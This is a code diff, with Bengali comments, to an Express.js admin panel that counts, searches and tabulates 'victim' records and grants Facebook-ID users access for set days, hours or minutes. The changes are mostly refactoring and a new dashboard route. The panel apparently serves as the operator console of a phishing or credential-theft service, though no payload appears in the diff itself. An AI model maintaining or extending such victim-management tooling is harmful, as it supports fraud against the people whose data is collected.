@@ -6,7 +6,7 @@ const Victim = require('../models/Victim');
 const { sendMessage } = require('../utils/helpers');
 
 // ============================
-// অ্যাডমিন লগইন চেক (মিডলওয়্যার)
+// অ্যাডমিন মিডলওয়্যার
 // ============================
 const isAdmin = (req, res, next) => {
     if (req.session.isAdmin) return next();
@@ -74,7 +74,7 @@ router.get('/admin/logout', (req, res) => {
 });
 
 // ================================================================
-// ড্যাশবোর্ড রেন্ডার ফাংশন
+// ড্যাশবোর্ড রেন্ডার ফাংশন (সব ট্যাব)
 // ================================================================
 async function renderDashboard(req, res) {
     const activeTab = req.query.tab || 'dashboard';
@@ -84,26 +84,20 @@ async function renderDashboard(req, res) {
     const error = req.query.error || '';
     const search = req.query.search || '';
 
-    // ডেটা লোড
+    // ----- ডেটা লোড -----
     let totalUsers = await User.countDocuments();
     let allowedUsers = await User.countDocuments({ allowed: true });
     let totalVictims = await Victim.countDocuments();
-    let victims = [];
+
     let users = [];
+    let victims = [];
 
     if (activeTab === 'users' || activeTab === 'dashboard') {
-        if (search) {
-            users = await User.find({ fbId: search });
-        } else {
-            users = await User.find().sort({ firstSeen: -1 }).limit(50);
-        }
+        users = search ? await User.find({ fbId: search }) : await User.find().sort({ firstSeen: -1 }).limit(50);
     }
 
     if (activeTab === 'victims' || activeTab === 'dashboard') {
-        let filter = {};
-        if (search) {
-            filter = { $or: [{ id: search }, { fbId: search }] };
-        }
+        const filter = search ? { $or: [{ id: search }, { fbId: search }] } : {};
         victims = await Victim.find(filter).sort({ timestamp: -1 }).limit(50);
     }
 
@@ -112,7 +106,7 @@ async function renderDashboard(req, res) {
     const allUsers = await User.find({}, 'fbId firstName');
     allUsers.forEach(u => { userMap[u.fbId] = u.firstName || 'N/A'; });
 
-    // ---------- ইউজার টেবিল (তিনটি ইনপুট ফিল্ড সহ) ----------
+    // ----- ইউজার টেবিল (তিনটি ইনপুট ফিল্ড সহ) -----
     let userRows = '';
     if (users && users.length > 0) {
         userRows = users.map(u => {
@@ -136,7 +130,6 @@ async function renderDashboard(req, res) {
                     <td style="font-size:12px;color:#6b7280;">${expiryText}</td>
                     <td>
                         <div class="action-group">
-                            <!-- 🔥 পারমিশন ফর্ম: তিনটি ইনপুট ফিল্ড (দিন, ঘন্টা, মিনিট) -->
                             <form method="POST" action="/admin/toggle-user" style="display:flex;gap:4px;align-items:center;flex-wrap:wrap;">
                                 <input type="hidden" name="userId" value="${u.fbId}">
                                 <input type="hidden" name="action" value="${u.allowed ? 'deny' : 'allow'}">
@@ -160,7 +153,7 @@ async function renderDashboard(req, res) {
         userRows = '<tr><td colspan="7" style="text-align:center;color:#9ca3af;padding:30px 0;">কোনো ইউজার নেই</td></tr>';
     }
 
-    // ভিক্টিম টেবিল
+    // ----- ভিক্টিম টেবিল -----
     let victimRows = '';
     if (victims && victims.length > 0) {
         victimRows = victims.map(v => {
@@ -194,7 +187,7 @@ async function renderDashboard(req, res) {
         victimRows = '<tr><td colspan="11" style="text-align:center;color:#9ca3af;padding:30px 0;">কোনো ভিক্টিম নেই</td></tr>';
     }
 
-    // ড্যাশবোর্ডে সাম্প্রতিক ভিক্টিম
+    // ----- ড্যাশবোর্ডে সাম্প্রতিক ভিক্টিম -----
     let recentVictimRows = '';
     const recent = victims.slice(0, 5);
     if (recent.length > 0) {
@@ -211,7 +204,7 @@ async function renderDashboard(req, res) {
         recentVictimRows = '<tr><td colspan="5" style="text-align:center;color:#9ca3af;padding:20px;">কোনো ভিক্টিম নেই</td></tr>';
     }
 
-    // ---------- HTML বিভাগ ----------
+    // ----- HTML বিভাগ -----
     const dashboardHtml = (activeTab === 'dashboard') ? `
     <div id="dashboard">
         <div class="stats">
@@ -417,7 +410,12 @@ async function renderDashboard(req, res) {
 }
 
 // ================================================================
-// POST রাউটস
+// 🔥 ড্যাশবোর্ড রাউট (এখানে সরাসরি কল হবে)
+// ================================================================
+router.get('/admin/dashboard', isAdmin, renderDashboard);
+
+// ================================================================
+// POST রাউটস (সব অ্যাকশন)
 // ================================================================
 
 // কনফিগ আপডেট
@@ -437,7 +435,7 @@ router.post('/admin/update-config', isAdmin, async (req, res) => {
 });
 
 // ================================================================
-// 🔥 ইউজার টগল (পারমিশন) – দিন/ঘন্টা/মিনিট ইনপুট থেকে সময় ক্যালকুলেশন
+// 🔥 ইউজার টগল – তিনটি ইনপুট ফিল্ড (দিন, ঘন্টা, মিনিট) থেকে সময় ক্যালকুলেশন
 // ================================================================
 router.post('/admin/toggle-user', isAdmin, async (req, res) => {
     try {
